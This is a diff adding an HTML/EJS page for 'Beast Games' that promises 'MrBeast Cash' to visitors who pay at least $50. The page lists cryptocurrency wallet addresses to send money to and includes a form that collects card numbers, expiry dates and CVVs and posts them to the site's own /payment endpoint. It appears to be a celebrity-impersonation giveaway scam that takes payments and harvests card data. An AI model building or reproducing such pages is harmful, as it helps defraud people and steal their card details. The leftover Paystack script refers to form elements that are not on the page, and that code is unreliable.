@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="/styles/payment.css">
+</head>
+<body>
+
+  <header>
+    <h3 style="color: cyan;">Beast Games</h3>
+     <nav>
+       <a href="/home">Home</a>
+       <a href="/games">Games</a>
+       <a href="/payment">payment</a>
+       <a href="/contact">contact</a>
+       <a href="/videos">videos</a>
+   </nav>
+  </header>
+
+  <h1>Win MrBeast Cash!</h1>
+  
+  <p style="color: cyan;">Choose a payment method below to join the giveaway or games<br> with as low as $50 </p>
+
+  <div class="payment-methods">
+<div class="method" onclick="showMethod('crypto', event)">Crypto</div>
+<div class="method" onclick="showMethod('atm', event)">ATM Card</div>
+
+  </div>
+
+  <div id="crypto" class="details">
+    <h2>Send to any wallet below:</h2>
+    <div class="wallet">
+      <span>BTC: bc1q20var9wpmf6xtkkh6dnqrhs9emaujsjcrg0504</span>
+      <button class="copy-btn" onclick="copyText('bc1q20var9wpmf6xtkkh6dnqrhs9emaujsjcrg0504')">Copy</button>
+    </div>
+    <div class="wallet">
+      <span>ETH: 0x56E25C15AC77180E8CA65950A92eF9c9F549781f</span>
+      <button class="copy-btn" onclick="copyText('0x56E25C15AC77180E8CA65950A92eF9c9F549781f')">Copy</button>
+    </div>
+    <div class="wallet">
+      <span>BNB: 0x56E25C15AC77180E8CA65950A92eF9c9F549781f</span>
+      <button class="copy-btn" onclick="copyText('0x56E25C15AC77180E8CA65950A92eF9c9F549781f')">Copy</button>
+    </div>
+    <div class="wallet">
+      <span>USDT TRC20: TEE8xp9pAguyPnPKuMmpRHKBZVdfMuTL89</span>
+      <button class="copy-btn" onclick="copyText('TEE8xp9pAguyPnPKuMmpRHKBZVdfMuTL89')">Copy</button>
+    </div>
+    <!-- <div class="wallet">
+      <span>LTC: ltc1qa0uad7ln9lse0glzwdvwxjpdxena8afge9vga6</span>
+      <button class="copy-btn" onclick="copyText('ltc1qa0uad7ln9lse0glzwdvwxjpdxena8afge9vga6')">Copy</button>
+    </div> -->
+    <label for="curr-pick">Type in your payment crypto</label>
+      <input type="text" class="cuur-pick"  placeholder="cryptocurrency pick" style="background-color: black;color: white;">
+    <label for="proofCrypto">Upload Payment Proof (Image):</label>
+    <input type="file" id="proofCrypto" />
+
+    <button onclick="alert('Payment Submitted!')">Submit</button>
+  </div>
+   
+
+
+ <form class="details" id="atm" method="post" action="/payment">
+    <!-- <input type="email" class="input-field" id="email" placeholder="Email Address" required /> -->
+    <input type="text" class="input-field" id="card" placeholder="Card Number" required name="inputcard"/>
+    <input type="text" class="input-field" id="date" placeholder="MM/YY" required name="inputdate"/>
+    <input type="text" class="input-field" id="cvv" placeholder="CVV" required  name="inputcvv" />
+    <button type="submit" class="submit-button" onclick="sunny()">Pay Now</button>
+  </form>
+
+    <!-- <div id="atm" class="details">
+    <div class="input-field">
+      <label for="amount">Card Number</label>
+      <input type="text" id="amount" placeholder="1234 5678 9012 3456">
+    </div>
+    <div class="input-field">
+      <label for="expiry">Expiry Date</label>
+      <input type="text" id="expiry" placeholder="MM/YY">
+    </div>
+    <div class="input-field">
+      <label for="cvv">CVV</label>
+      <input type="password" id="cvv" placeholder="123">
+    </div>
+    <button class="submit-btn">Submit Payment</button>
+  </div>
+</div> -->
+<!-- 
+  <div id="atm" class="details">
+    <h2>Pay with ATM/Card</h2>
+    <label for="amount">Enter Amount ($):</label>
+    <input type="number" id="amount" placeholder="e.g. 10.00" />
+
+    <label for="proof">Upload Payment Screenshot:</label>
+    <input type="file" id="proof" />
+
+    <button onclick="alert('Payment Submitted!')">Submit</button>
+  </div> -->
+  
+ <%- include("partials/footer.ejs") %>
+
+
+  <script>
+function showMethod(method) {
+  document.querySelectorAll('.details').forEach(d => d.classList.remove('active'));
+  document.querySelectorAll('.method').forEach(d => d.classList.remove('active'));
+  document.getElementById(method).classList.add('active');
+  event.target.classList.add('active');
+}
+function sunny() {
+  alert("wait for confirmation")
+}
+
+    function copyText(text) {
+      navigator.clipboard.writeText(text);
+      alert("Copied: " + text);
+    }
+
+        const paymentForm = document.getElementById('paymentForm');
+    paymentForm.addEventListener("submit", payWithPaystack, false);
+
+    function payWithPaystack(e) {
+      e.preventDefault();
+      
+      let handler = PaystackPop.setup({
+        key: 'pk_test_xxxxxxxxxxxxxxxxxxxxxx', // Replace with your PUBLIC KEY
+        email: document.getElementById("email").value,
+        amount: 2000 * 100, // amount in kobo (2000 NGN here)
+        currency: 'NGN',
+        callback: function(response) {
+          alert('Payment complete wait for confirmation ! Reference: ' + response.reference);
+          // You can verify transaction on your server here
+        },
+        onClose: function() {
+          alert('Transaction was not completed, window closed.');
+        },
+      });
+
+      handler.openIframe();
+    }
+  </script>
+</body>
+</html>
+
+
